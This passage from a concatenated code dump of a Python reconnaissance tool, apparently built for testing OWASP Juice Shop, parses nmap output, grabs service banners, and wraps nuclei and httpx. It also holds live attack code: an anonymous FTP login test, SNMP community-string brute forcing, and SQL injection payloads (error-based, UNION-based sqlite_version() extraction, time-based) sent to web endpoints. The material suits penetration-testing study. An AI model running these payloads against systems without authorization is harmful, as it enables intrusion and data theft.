                    logger.info(f"[RECON]       - NSE scripts found: {len(svc['script'])}")
                    
                    nse_scripts = svc["script"]  # 🔥 NSE 저장
                    
                    for script_name, script_output in svc["script"].items():
                        print(f"[RECON]         Script: {script_name}")
                        logger.info(f"[RECON]         Script: {script_name}")
                        
                        output_str = str(script_output)
                        print(f"[RECON]         Output: {output_str[:300]}")
                        logger.info(f"[RECON]         Output: {output_str[:200]}")
                        
                        # http-server-header 파싱
                        if script_name == "http-server-header" and script_output:
                            server_header = output_str.strip()
                            print(f"[RECON]         ✓ Server header detected: {server_header}")
                            logger.info(f"[RECON]         Server header: {server_header}")
                            
                            if server_header and (not product or product == ""):
                                if "/" in server_header:
                                    parts = server_header.split("/")
                                    product = parts[0].strip()
                                    version = parts[1].strip() if len(parts) > 1 else ""
                                else:
                                    product = server_header.strip()
                                
                                print(f"[RECON]         ✓ Extracted product={product}, version={version}")
                                logger.info(f"[RECON]         Extracted product={product}, version={version}")
                        
                        # http-title 파싱
                        elif script_name == "http-title" and script_output:
                            title = output_str.strip()
                            print(f"[RECON]         ✓ Page title: {title}")
                            logger.info(f"[RECON]         Page title: {title}")
                            
                            if "juice shop" in title.lower():
                                if not product or product == "":
                                    product = "OWASP Juice Shop"
                                
                                print(f"[RECON]         ✓ Detected Juice Shop from title")
                                logger.info(f"[RECON]         Detected Juice Shop")
                                
                                version_match = re.search(r'v?(\d+\.\d+\.\d+)', title)
                                if version_match and not version:
                                    version = version_match.group(1)
                                    print(f"[RECON]         ✓ Version from title: {version}")
                                    logger.info(f"[RECON]         Version from title: {version}")
                        
                        # http-headers 파싱
                        elif script_name == "http-headers" and script_output:
                            if "X-Powered-By" in output_str or "x-powered-by" in output_str.lower():
                                powered_by_match = re.search(r'X-Powered-By[:\s]+([^\r\n]+)', output_str, re.IGNORECASE)
                                if powered_by_match:
                                    powered_by = powered_by_match.group(1).strip()
                                    print(f"[RECON]         ✓ X-Powered-By: {powered_by}")
                                    logger.info(f"[RECON]         X-Powered-By: {powered_by}")
                                    
                                    if not product or product == "":
                                        if "/" in powered_by:
                                            parts = powered_by.split("/")
                                            product = parts[0].strip()
                                            version = parts[1].strip() if len(parts) > 1 else ""
                                        else:
                                            product = powered_by.strip()
                                        
                                        print(f"[RECON]         ✓ From X-Powered-By: product={product}, version={version}")
                                        logger.info(f"[RECON]         From X-Powered-By: product={product}, version={version}")
                        
                        # 취약점 스크립트 탐지
                        is_vulnerable = False
                        severity = "INFO"
                        script_output_str = output_str.lower()
                        
                        if "vulnerable" in script_output_str or "vuln" in script_name.lower():
                            is_vulnerable = True
                            if "critical" in script_output_str or "high" in script_output_str:
                                severity = "HIGH"
                            elif "medium" in script_output_str:
                                severity = "MEDIUM"
                            else:
                                severity = "LOW"
                        
                        vulnerabilities.append({
                            "script_name": script_name,
                            "output": script_output,
                            "vulnerable": is_vulnerable,
                            "severity": severity
                        })
                
                # 🔥 NSE 결과로 제품명 개선
                if nse_scripts:
                    product, version = enhance_product_detection_from_nse(
                        service_name, product, version, nse_scripts
                    )
                    print(f"[RECON]     ✨ Enhanced: {product} {version}")
                    logger.info(f"[RECON]     Enhanced: {product} {version}")
                
                # 🔥 여전히 product가 없거나 ppp인 경우 폴백
                if not product or product == "" or product == "ppp":
                    if service_name and service_name != "ppp":
                        product = service_name
                        print(f"[RECON]     🔄 Using service_name as product: {product}")
                        logger.info(f"[RECON]     Using service_name as product: {product}")
                    elif port in [3000, 8080, 8000]:
                        # 일반적인 웹 포트는 HTTP로 추정
                        product = "HTTP"
                        print(f"[RECON]     🔄 Port {port} assumed to be HTTP")
                        logger.info(f"[RECON]     Port {port} assumed to be HTTP")
                
                full_version = parse_service_version(product, version)
                print(f"[RECON]     ✓ Final Port {port}: {service_name} {product} {version}")
                logger.info(f"[RECON]     Final: {service_name} {product} {version}")
                
                port_info = {
                    "port": port,
                    "protocol": proto,
                    "state": svc.get("state", ""),
                    "service": service_name,
                    "product": product,
                    "version": version,
                    "full_version": full_version
                }
                
                if vulnerabilities:
                    port_info["nse_scripts"] = vulnerabilities
                    port_info["has_vulnerabilities"] = any(v.get("vulnerable") for v in vulnerabilities)
                
                host_data["ports"].append(port_info)
        
        hosts.append(host_data)
        print(f"[RECON] ✓ Host {host_ip}: {len(host_data['ports'])} ports added")
        logger.info(f"[RECON] Host {host_ip}: {len(host_data['ports'])} ports added")
    
    print(f"[RECON] ✅ Scan completed: {len(hosts)} hosts, {sum(len(h['ports']) for h in hosts)} total ports")
    logger.info(f"[RECON] Scan completed: {len(hosts)} hosts, {sum(len(h['ports']) for h in hosts)} total ports")
    
    return hosts


def analyze_ssl_tls(target: str, port: int = 443) -> Dict[str, Any]:
    """
    SSL/TLS 상세 분석
    
    Returns:
        {
            "tls_version": "TLSv1.2",
            "cipher": "...",
            "certificate": {...}
        }
    """
    ssl_info = {
        "tls_version": None,
        "cipher": None,
        "certificate": {}
    }
    
    try:
        context = ssl.create_default_context()
        with socket.create_connection((target, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                ssl_info["tls_version"] = ssock.version()
                ssl_info["cipher"] = ssock.cipher()
                
                cert = ssock.getpeercert()
                if cert:
                    ssl_info["certificate"] = {
                        "subject": dict(x[0] for x in cert.get("subject", [])),
                        "issuer": dict(x[0] for x in cert.get("issuer", [])),
                        "version": cert.get("version"),
                        "notAfter": cert.get("notAfter")
                    }
    except Exception as e:
        logger.warning(f"SSL/TLS 분석 실패 ({target}:{port}): {e}")
    
    return ssl_info


def analyze_ssh_details(target: str, port: int = 22) -> Dict[str, Any]:
    """
    SSH 상세 정보 분석
    
    Returns:
        {
            "version": "SSH-2.0-OpenSSH_7.4",
            "key_exchange": [...],
            "encryption": [...]
        }
    """
    ssh_info = {
        "version": None,
        "key_exchange": [],
        "encryption": []
    }
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        
        ssh_info["version"] = banner.strip()
    except Exception as e:
        logger.warning(f"SSH 분석 실패 ({target}:{port}): {e}")
    
    return ssh_info


def analyze_smb_details(target: str, port: int = 445) -> Dict[str, Any]:
    """
    SMB/Samba 상세 정보 분석
    
    Returns:
        {
            "version": "SMBv2",
            "shares": [...]
        }
    """
    smb_info = {
        "version": None,
        "shares": [],
        "os_info": None
    }
    
    # Nmap 스크립트를 통한 SMB 정보 수집은 별도 구현 필요
    # 여기서는 기본 구조만 제공
    return smb_info


def analyze_ftp(target: str, port: int = 21) -> Dict[str, Any]:
    """
    FTP 배너 그랩핑 및 익명 접근 테스트
    
    Returns:
        {
            "version": "vsftpd 3.0.3",
            "anonymous_access": True,
            "banner": "..."
        }
    """
    ftp_info = {
        "version": None,
        "anonymous_access": False,
        "banner": None
    }
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        sock.close()
        
        ftp_info["banner"] = banner.strip()
        
        # 배너에서 버전 추출
        version_match = re.search(r'([\w]+)\s*([\d.]+)', banner, re.IGNORECASE)
        if version_match:
            ftp_info["version"] = f"{version_match.group(1)} {version_match.group(2)}"
        
        # 익명 접근 테스트
        try:
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=5)
            ftp.login('anonymous', 'anonymous@')
            ftp_info["anonymous_access"] = True
            ftp.quit()
        except:
            ftp_info["anonymous_access"] = False
            
    except Exception as e:
        logger.warning(f"FTP 분석 실패 ({target}:{port}): {e}")
    
    return ftp_info


def analyze_rdp(target: str, port: int = 3389) -> Dict[str, Any]:
    """
    RDP 버전 및 취약점 확인
    
    Returns:
        {
            "version": "RDP 10.0",
            "nla_enabled": True,
            "vulnerable": False
        }
    """
    rdp_info = {
        "version": None,
        "nla_enabled": False,
        "vulnerable": False
    }
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        
        # RDP 핸드셰이크 패킷 전송
        rdp_handshake = b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00'
        sock.send(rdp_handshake)
        response = sock.recv(1024)
        sock.close()
        
        # 응답에서 버전 정보 추출 시도
        if response:
            rdp_info["version"] = "RDP Detected"
            # NLA 활성화 여부는 더 복잡한 프로토콜 파싱 필요
            # 여기서는 기본 구조만 제공
            
    except Exception as e:
        logger.warning(f"RDP 분석 실패 ({target}:{port}): {e}")
    
    return rdp_info


def analyze_snmp(target: str, port: int = 161) -> Dict[str, Any]:
    """
    SNMP 커뮤니티 스트링 브루트포싱
    
    Returns:
        {
            "community_strings": ["public", "private"],
            "accessible": True
        }
    """
    snmp_info = {
        "community_strings": [],
        "accessible": False
    }
    
    common_strings = ['public', 'private', 'community', 'manager', 'admin']
    
    try:
        import subprocess
        for community in common_strings[:5]:  # 처음 5개만 테스트
            try:
                # snmpwalk 명령어로 테스트 (시스템에 snmpwalk가 설치되어 있어야 함)
                result = subprocess.run(
                    ['snmpwalk', '-v2c', '-c', community, target],
                    timeout=3,
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    snmp_info["community_strings"].append(community)
                    snmp_info["accessible"] = True
            except (subprocess.TimeoutExpired, FileNotFoundError):
                continue
    except Exception as e:
        logger.warning(f"SNMP 분석 실패 ({target}:{port}): {e}")
    
    return snmp_info


def collect_network_info(target: str, nm_scan_result) -> Dict[str, Any]:
    """
    네트워크 서비스 상세 정보 종합 수집
    
    Args:
        target: 타겟 호스트
        nm_scan_result: Nmap PortScanner 객체
    
    Returns:
        {
            "ssl_tls_info": {...},
            "ssh_info": {...},
            "smb_info": {...},
            "network_technologies": [...]
        }
    """
    logger.info("네트워크 서비스 상세 정보 수집 시작")
    
    network_technologies = []
    
    # SSL/TLS 정보
    ssl_info = {}
    try:
        for host in nm_scan_result.all_hosts():
            for proto in nm_scan_result[host].all_protocols():
                ports = nm_scan_result[host][proto].keys()
                for port in ports:
                    if port in [443, 8443]:
                        ssl_info = analyze_ssl_tls(host, port)
                        if ssl_info.get("tls_version"):
                            network_technologies.append({
                                "type": "ssl_tls",
                                "name": f"TLS {ssl_info['tls_version']}",
                                "source": "SSL/TLS Analysis",
                                "port": port
                            })
                        break
    except Exception as e:
        logger.warning(f"SSL/TLS 정보 수집 실패: {e}")
    
    # SSH 정보
    ssh_info = {}
    try:
        for host in nm_scan_result.all_hosts():
            for proto in nm_scan_result[host].all_protocols():
                ports = nm_scan_result[host][proto].keys()
                for port in ports:
                    if port == 22:
                        ssh_info = analyze_ssh_details(host, port)
                        if ssh_info.get("version"):
                            network_technologies.append({
                                "type": "ssh",
                                "name": ssh_info["version"],
                                "source": "SSH Banner",
                                "port": port
                            })
                        break
    except Exception as e:
        logger.warning(f"SSH 정보 수집 실패: {e}")
    
    # FTP 정보
    ftp_info = {}
    try:
        for host in nm_scan_result.all_hosts():
            for proto in nm_scan_result[host].all_protocols():
                ports = nm_scan_result[host][proto].keys()
                for port in ports:
                    if port == 21:
                        ftp_info = analyze_ftp(host, port)
                        if ftp_info.get("version") or ftp_info.get("anonymous_access"):
                            network_technologies.append({
                                "type": "ftp",
                                "name": ftp_info.get("version", "FTP"),
                                "source": "FTP Analysis",
                                "port": port,
                                "anonymous_access": ftp_info.get("anonymous_access", False)
                            })
                        break
    except Exception as e:
        logger.warning(f"FTP 정보 수집 실패: {e}")
    
    # RDP 정보
    rdp_info = {}
    try:
        for host in nm_scan_result.all_hosts():
            for proto in nm_scan_result[host].all_protocols():
                ports = nm_scan_result[host][proto].keys()
                for port in ports:
                    if port == 3389:
                        rdp_info = analyze_rdp(host, port)
                        if rdp_info.get("version"):
                            network_technologies.append({
                                "type": "rdp",
                                "name": rdp_info.get("version", "RDP"),
                                "source": "RDP Analysis",
                                "port": port
                            })
                        break
    except Exception as e:
        logger.warning(f"RDP 정보 수집 실패: {e}")
    
    # SNMP 정보
    snmp_info = {}
    try:
        for host in nm_scan_result.all_hosts():
            for proto in nm_scan_result[host].all_protocols():
                ports = nm_scan_result[host][proto].keys()
                for port in ports:
                    if port == 161:
                        snmp_info = analyze_snmp(host, port)
                        if snmp_info.get("accessible"):
                            network_technologies.append({
                                "type": "snmp",
                                "name": f"SNMP (Community: {', '.join(snmp_info.get('community_strings', []))})",
                                "source": "SNMP Analysis",
                                "port": port,
                                "accessible": True
                            })
                        break
    except Exception as e:
        logger.warning(f"SNMP 정보 수집 실패: {e}")
    
    return {
        "ssl_tls_info": ssl_info,
        "ssh_info": ssh_info,
        "ftp_info": ftp_info,
        "rdp_info": rdp_info,
        "snmp_info": snmp_info,
        "network_technologies": network_technologies
    }

def sanitize_target_for_nmap(target: str) -> tuple:
    """
    타겟 주소를 Nmap용과 웹용으로 분리 정제
    
    Args:
        target: 원본 타겟 (http://localhost:3000, 192.168.1.1, example.com)
        
    Returns:
        (nmap_target, web_target, port) 튜플
    """
    original_target = target
    port = None
    
    # HTTP/HTTPS 프로토콜 제거
    target_clean = target.replace("http://", "").replace("https://", "")
    
    # 경로 제거 (example.com/path -> example.com)
    if "/" in target_clean:
        target_clean = target_clean.split("/")[0]
    
    # 포트 분리
    if ":" in target_clean:
        host, port_str = target_clean.rsplit(":", 1)
        try:
            port = int(port_str)
            target_clean = host
        except ValueError:
            # 포트가 아니면 (IPv6 등) 그대로 유지
            pass
    
    # Nmap용 타겟
    nmap_target = target_clean
    
    # 웹용 타겟 (프로토콜 포함)
    if not original_target.startswith("http"):
        if port == 443 or port == 8443:
            web_target = f"https://{target_clean}"
        else:
            web_target = f"http://{target_clean}"
        
        if port and port not in [80, 443]:
            web_target = f"{web_target}:{port}"
    else:
        web_target = original_target
    
    logger.info(f"[TARGET] Original: {original_target}")
    logger.info(f"[TARGET] Nmap: {nmap_target} | Web: {web_target} | Port: {port}")
    
    return nmap_target, web_target, port
```
---

## File 31: os.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\os.py`

```python
# app/core/recon/os.py
# OS 및 시스템 레벨 정보 수집 모듈

import re
import logging
from typing import Dict, Any, List, Optional

logger = logging.getLogger(__name__)
import nmap


def detect_os_from_nmap(nm_scan_result) -> Dict[str, Any]:
    """
    Nmap OS 핑거프린팅 결과에서 OS 정보 추출
    
    Returns:
        {
            "os_type": "Linux",
            "os_version": "3.2-4.9",
            "os_details": [...],
            "accuracy": 95
        }
    """
    os_info = {
        "os_type": None,
        "os_version": None,
        "os_details": [],
        "accuracy": 0
    }
    
    try:
        for host in nm_scan_result.all_hosts():
            osmatch = nm_scan_result[host].get("osmatch", [])
            if osmatch:
                # 가장 정확도가 높은 OS 정보 사용
                best_match = max(osmatch, key=lambda x: x.get("accuracy", 0))
                
                os_info["os_type"] = best_match.get("name", "").split()[0] if best_match.get("name") else None
                os_info["os_version"] = best_match.get("name", "")
                os_info["os_details"] = osmatch
                os_info["accuracy"] = best_match.get("accuracy", 0)
                break
    except Exception as e:
        logger.warning(f"OS 탐지 실패: {e}")
    
    return os_info


def detect_system_services(nm_scan_result) -> List[Dict[str, Any]]:
    """
    시스템 서비스 정보 수집 (SSH, 시스템 라이브러리 등)
    
    Returns:
        [
            {
                "service": "ssh",
                "version": "OpenSSH 7.4",
                "port": 22,
                "cpe": "cpe:2.3:a:openssh:openssh:7.4"
            }
        ]
    """
    system_services = []
    
    try:
        for host in nm_scan_result.all_hosts():
            for proto in nm_scan_result[host].all_protocols():
                ports = nm_scan_result[host][proto].keys()
                for port in ports:
                    svc = nm_scan_result[host][proto][port]
                    service_name = svc.get("name", "").lower()
                    
                    # 시스템 서비스만 필터링
                    if service_name in ["ssh", "sshd"]:
                        product = svc.get("product", "")
                        version = svc.get("version", "")
                        
                        system_services.append({
                            "service": "openssh",
                            "version": version or product,
                            "port": port,
                            "product": product,
                            "full_info": f"{product} {version}".strip()
                        })
    except Exception as e:
        logger.warning(f"시스템 서비스 탐지 실패: {e}")
    
    return system_services


def collect_os_info(nm_scan_result) -> Dict[str, Any]:
    """
    OS 및 시스템 레벨 정보 종합 수집
    
    Args:
        nm_scan_result: Nmap PortScanner 객체
    
    Returns:
        {
            "os_info": {...},
            "system_services": [...],
            "os_technologies": [...]
        }
    """
    logger.info("OS 정보 수집 시작")
    
    # OS 핑거프린팅
    os_info = detect_os_from_nmap(nm_scan_result)
    
    # 시스템 서비스 탐지
    system_services = detect_system_services(nm_scan_result)
    
    # OS 기술 스택 종합
    os_technologies = []
    
    if os_info.get("os_type"):
        os_technologies.append({
            "type": "operating_system",
            "name": os_info["os_version"] or os_info["os_type"],
            "source": "OS Fingerprinting",
            "accuracy": os_info.get("accuracy", 0)
        })
    
    for svc in system_services:
        os_technologies.append({
            "type": "system_service",
            "name": svc.get("full_info", ""),
            "source": "Nmap Scan",
            "port": svc.get("port")
        })
    
    return {
        "os_info": os_info,
        "system_services": system_services,
        "os_technologies": os_technologies
    }

```
---

## File 32: refine_logic.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\refine_logic.py`

```python

def refine_tech_data(raw_results):
    merged = {}
    for item in raw_results:
        # 1. 이름과 버전 정제 (v 제거 및 분리)
        name = str(item.get('name', '')).lower().strip()
        ver = str(item.get('version', '')).replace('v', '').strip()
        source = item.get('source', 'Unknown')
        
        if ':' in name:
            name, ver = name.split(':', 1)
        elif '/' in name:
            name, ver = name.split('/', 1)
            
        if not ver or ver.lower() == 'unknown':
            ver = "Unknown"

        # 2. 기술명 기준으로 데이터 통합
        if name not in merged:
            merged[name] = {
                "name": name,
                "version": ver,
                "sources": [source],
                "evidences": {source: item.get('raw_data', f"Detected via {source}")}
            }
        else:
            if merged[name]["version"] == "Unknown" and ver != "Unknown":
                merged[name]["version"] = ver
            if source not in merged[name]["sources"]:
                merged[name]["sources"].append(source)
                merged[name]["evidences"][source] = item.get('raw_data', f"Confirmed via {source}")
    
    return list(merged.values())
```
---

## File 33: scanner_integrations.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\scanner_integrations.py`

```python
import subprocess
import json
import logging
from typing import List, Dict, Any

logger = logging.getLogger(__name__)

class NucleiScanner:
    """Nuclei 스캐너 통합 (수리 완료)"""
    def __init__(self, templates_path: str = None):
        self.templates_path = templates_path or "/home/lsm/.config/nuclei/nuclei-templates"

    def _categorize_from_tags(self, tags: List[str]) -> str:
        """태그로부터 카테고리 추론"""
        tags_str = " ".join(tags).lower()
        if any(x in tags_str for x in ["cms", "wordpress", "drupal", "joomla"]): return "cms"
        if any(x in tags_str for x in ["javascript", "js", "frontend", "angular", "react", "vue"]): return "frontend"
        if any(x in tags_str for x in ["backend", "server", "api"]): return "backend"
        if any(x in tags_str for x in ["database", "mysql", "postgres", "mongodb"]): return "database"
        if any(x in tags_str for x in ["panel", "admin", "login"]): return "application"
        return "other"

    def scan_tech_detection(self, target: str) -> List[Dict[str, Any]]:
        technologies = []
        try:
            print(f"[NUCLEI] Running technology detection on {target}...")
            # 확인된 nuclei 절대 경로 사용
            cmd = ["/home/lsm/go/bin/nuclei", "-u", target, "-tags", "tech-detect", "-json", "-silent"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.stdout.strip():
                for line in result.stdout.strip().split("\n"):
                    if not line.strip(): continue
                    try:
                        data = json.loads(line)
                        technologies.append({
                            "name": data.get("info", {}).get("name", "Unknown"),
                            "product": data.get("template-id"),
                            "category": self._categorize_from_tags(data.get("info", {}).get("tags", [])),
                            "source": "nuclei"
                        })
                    except: continue
            print(f"[NUCLEI] Found {len(technologies)} technologies")
        except Exception as e:
            logger.error(f"NUCLEI Error: {e}")
        return technologies

class HttpxScanner:
    """httpx 스캐너 통합"""
    def scan_tech_detection(self, target: str) -> List[Dict[str, Any]]:
        technologies = []
        try:
            print(f"[HTTPX] Running scan on {target}...")
            cmd = ["httpx", "-tech-detect", "-server", "-json", "-silent"]
            result = subprocess.run(cmd, input=target + "\n", capture_output=True, text=True, timeout=30)
            
            if result.stdout.strip():
                for line in result.stdout.strip().split("\n"):
                    if not line: continue
                    try:
                        data = json.loads(line)
                        if "server" in data:
                            technologies.append({"name": data["server"], "category": "webserver", "source": "httpx"})
                        for tech in data.get("tech", []):
                            technologies.append({"name": tech, "category": "detected", "source": "httpx"})
                    except: continue
            print(f"[HTTPX] Found {len(technologies)} technologies")
        except Exception as e:
            logger.error(f"HTTPX Error: {e}")
        return technologies

class RetireJsScanner:
    """Retire.js 스캐너 (안전 파싱)"""
    def scan_tech_detection(self, target: str) -> List[Dict[str, Any]]:
        technologies = []
        try:
            print(f"[RETIRE.JS] URL scanning (limited) for {target}")
            cmd = ["retire", "--outputformat", "json", "--severity", "low"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            raw = result.stdout.strip()
            if raw.startswith("[") or raw.startswith("{"):
                try: json.loads(raw)
                except: pass
        except Exception as e:
            logger.error(f"RETIRE.JS Error: {e}")
        return technologies

    def get_max_severity(self, vulns: List[Dict]) -> str:
        severity_order = {'critical': 4, 'high': 3, 'medium': 2, 'low': 1, 'unknown': 0}
        max_sev, max_val = 'unknown', 0
        for vuln in vulns:
            sev = vuln.get('severity', 'unknown').lower()
            if severity_order.get(sev, 0) > max_val:
                max_val = severity_order[sev]
                max_sev = sev
        return max_sev
```
---

## File 34: technologies.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\technologies.py`

```python
import requests
import time
import logging
import re
from typing import List, Dict, Any, Set
from urllib.parse import urljoin, quote

logger = logging.getLogger(__name__)

# 전역 설정
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_TIMEOUT = 10

def debug_print(msg):
    print(f"[DEBUG-TECH] {msg}")

def detect_backend_technologies(target_url: str, known_endpoints: List[str] = None) -> List[Dict[str, Any]]:
    """
    백엔드 심층 탐지 + 버전 정밀 추출 (Data Exfiltration)
    """
    # 안전장치: 함수 내부에서 상수 재정의
    current_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    
    debug_print(f"Starting analysis for: {target_url}")
    
    technologies: List[Dict[str, Any]] = []
    detected_keys: Set[str] = set()
    session = requests.Session()
    session.headers.update({"User-Agent": current_user_agent})
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    def add_tech(product: str, version: str = "Unknown", category: str = "backend", source: str = "Unknown"):
        # 이미 등록된 기술이라도 버전이 'Unknown'이고 새 정보가 구체적이면 업데이트
        key = f"{product}" # 키를 제품명으로만 관리하여 업데이트 가능하게 함
        
        # 기존에 찾은게 있는지 확인
        existing = next((item for item in technologies if item["product"] == product), None)
        
        if existing:
            if existing["version"] == "Unknown" and version != "Unknown":
                existing["version"] = version
                existing["source"] = source
                logger.info(f"[TECH-DETECT] Updated {product} version to {version}")
                debug_print(f"!!! UPDATE !!! {product} version -> {version} via {source}")
        else:
            technologies.append({
                "name": product, "product": product, "version": version, "category": category, "source": source
            })
            detected_keys.add(key)
            logger.info(f"[TECH-DETECT] Found {product} via {source}")
            debug_print(f"!!! FOUND !!! {product} ({version}) via {source}")

    # --------------------------------------------------------------------------
    # [NEW] SQLite 버전 추출 함수 (Marker 추가 버전)
    # --------------------------------------------------------------------------
    def try_extract_sqlite_version(vuln_url: str):
        debug_print(f"--> Attempting to extract SQLite version from: {vuln_url}")
        
        base_url = vuln_url.split('?')[0] if '?' in vuln_url else vuln_url
        
        for col_count in range(1, 10):
            cols = [f"'{i}'" for i in range(1, col_count + 1)]
            
            # [핵심] 마커를 붙여서 헷갈리지 않게 함
            # SQLite 문자열 연결 연산자는 || 입니다.
            if col_count >= 2:
                cols[1] = "'VER:' || sqlite_version() || ':END'"
            else:
                cols[0] = "'VER:' || sqlite_version() || ':END'"
                
            payload_str = ",".join(cols)
            payload = f"') UNION SELECT {payload_str}--"
            
            try:
                full_attack_url = f"{base_url}?q={quote(payload)}"
                resp = session.get(full_attack_url, timeout=5, verify=False)
                
                # [핵심] 마커(VER:...:END)를 기준으로 추출
                match = re.search(r"VER:(.*?):END", resp.text)
                if match:
                    found_ver = match.group(1)
                    debug_print(f"    [EXPLOIT SUCCESS] Columns: {col_count} | Version: {found_ver}")
                    add_tech("SQLite", version=found_ver, category="database", source="Union-Based SQLi (Verified)")
                    return True
            except: pass
        return False

    # ==============================================================================
    # 1. 대상 엔드포인트 선정
    # ==============================================================================
    critical_defaults = [
        "/rest/products/search",
        "/api/Products/1", 
        "/api/Feedbacks",
        "/api/login"
    ]
    
    discovered = []
    if known_endpoints:
        discovered = [ep for ep in known_endpoints if 'api' in ep or 'rest' in ep][:3]
    
    final_targets = []
    for path in critical_defaults: final_targets.append(urljoin(target_url, path))
    for ep in discovered:
        if ep.startswith("http"): final_targets.append(ep)
        else: final_targets.append(urljoin(target_url, ep))
    final_targets = list(set(final_targets))
    
    debug_print(f"Target endpoints ({len(final_targets)}): {final_targets}")

    # ==============================================================================
    # 2. 공격 실행
    # ==============================================================================
    killer_payloads = ["'", "'))--", "' OR 1=1--"]
    time_payloads = {
        "SQLite": ["' OR (SELECT count(*) FROM sqlite_master AS T1, sqlite_master AS T2, sqlite_master AS T3) OR '"]
    }

    for full_url in final_targets:
        debug_print(f"--> Testing Endpoint: {full_url}")
        
        # 이미 버전을 찾았으면 중단
        sqlite_tech = next((t for t in technologies if t['product'] == 'SQLite'), None)
        if sqlite_tech and sqlite_tech['version'] != "Unknown": break

        # [전략 A] Killer Payloads & Version Extraction
        for payload in killer_payloads:
            try:
                # URL 생성
                if '?' in full_url: attack_url = f"{full_url}&q={quote(payload)}"
                else: attack_url = f"{full_url}?q={quote(payload)}"
                
                resp = session.get(attack_url, timeout=5, verify=False)
                content = resp.text
                err_msg = ""
                try: err_msg = str(resp.json())
                except: pass

                # 탐지 로직
                found_sqlite = False
                if 'SQLITE' in err_msg.upper() or 'SQLITE' in content.upper():
                    add_tech("SQLite", category="database", source=f"Error (Killer Payload)")
                    found_sqlite = True
                
                # 탐지되었다면 즉시 버전 추출 시도
                if found_sqlite:
                    try_extract_sqlite_version(full_url)
                    
            except: pass

        # [전략 B] Time-Based Check (버전 추출이 안됐을 때만)
        if any(t['name'] == 'SQLite' for t in technologies): continue

        for db, payloads in time_payloads.items():
            for payload in payloads:
                try:
                    start = time.time()
                    session.get(full_url, timeout=5, verify=False)
                    normal_time = time.time() - start
                    
                    if '?' in full_url: attack_url = f"{full_url}&q={quote(payload)}"
                    else: attack_url = f"{full_url}?q={quote(payload)}"

                    start = time.time()
                    session.get(attack_url, timeout=10, verify=False)
                    attack_time = time.time() - start
                    
                    if attack_time > normal_time + 2.0:
                        debug_print(f"    !!! TIME DELAY DETECTED !!!")
                        add_tech(db, category="database", source=f"Time-Based Injection")
                        break
                except: pass

    debug_print(f"Analysis finished. Found: {len(technologies)} techs")
    return technologies
```
---

## File 35: unifier.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\unifier.py`

```python
# app/core/recon/unifier.py
from typing import Dict, List, Any, Optional

class TechUnifier:
    """
    여러 스캔 소스에서 수집된 기술 정보를 통합하고 교차 검증하는 클래스
    (SocketIO 지원 추가)
    """
    def __init__(self, socketio=None):
        self.tech_stack: Dict[str, Dict[str, Any]] = {}
        self.socketio = socketio # 소켓 객체 저장

    def _emit(self, event: str, data: Dict[str, Any]):
        """소켓이 연결되어 있으면 이벤트 전송"""
        if self.socketio:
            try:
                self.socketio.emit(event, data)
            except Exception:
                pass

    def add_tech(self, name: str, version: str = "", category: str = "unknown", 
                 source: str = "unknown", confidence: int = 0):
        if not name or name.lower() == "unknown":
            return

        tech_key = name.lower()
        is_new = tech_key not in self.tech_stack
        
        # 1. 정보 업데이트/추가
        if is_new:
            self.tech_stack[tech_key] = {
                'name': name,
                'version': version,
                'category': category,
                'confidence': confidence,
                'sources': [source]
            }
        else:
            entry = self.tech_stack[tech_key]
            entry['confidence'] = min(100, entry['confidence'] + confidence)
            if source not in entry['sources']:
                entry['sources'].append(source)
            if (not entry['version'] or entry['version'] == "Unknown") and version:
                entry['version'] = version
            elif version and len(version) > len(entry['version']):
                entry['version'] = version

        # 2. [방송] 실시간 로그 전송
        # 예: "[+] Found Nginx (Confidence: 60) via Recog"
        log_msg = f"Detected {name} via {source}"
        if version: log_msg += f" (v{version})"
        
        self._emit('scan_log', {
            'message': log_msg,
            'level': 'success' if confidence > 80 else 'info',
            'confidence': self.tech_stack[tech_key]['confidence']
        })

        # 3. [방송] 기술 스택 업데이트 전송 (대시보드 게이지용)
        self._emit('tech_update', {
            'name': self.tech_stack[tech_key]['name'],
            'confidence': self.tech_stack[tech_key]['confidence'],
            'version': self.tech_stack[tech_key]['version'] or "Unknown",
            'category': self.tech_stack[tech_key]['category']
        })

    def get_results(self, min_confidence: int = 30) -> List[Dict[str, Any]]:
        results = []
        for tech in self.tech_stack.values():
            if tech['confidence'] >= min_confidence:
                results.append({
                    'name': tech['name'],
                    'version': tech['version'] or "Unknown",
                    'category': tech['category'],
                    'confidence': tech['confidence'],
                    'source': ", ".join(tech['sources']),
                    'type': 'unified'
                })
        return sorted(results, key=lambda x: x['confidence'], reverse=True)

    def merge_list(self, tech_list: List[Dict[str, Any]]):
        for item in tech_list:
            self.add_tech(
                name=item.get('name'),
                version=item.get('version', ''),
                category=item.get('category', 'unknown'),
                source=item.get('source', 'unknown'),
                confidence=item.get('confidence', 50)
            )
```
---

## File 36: web.py
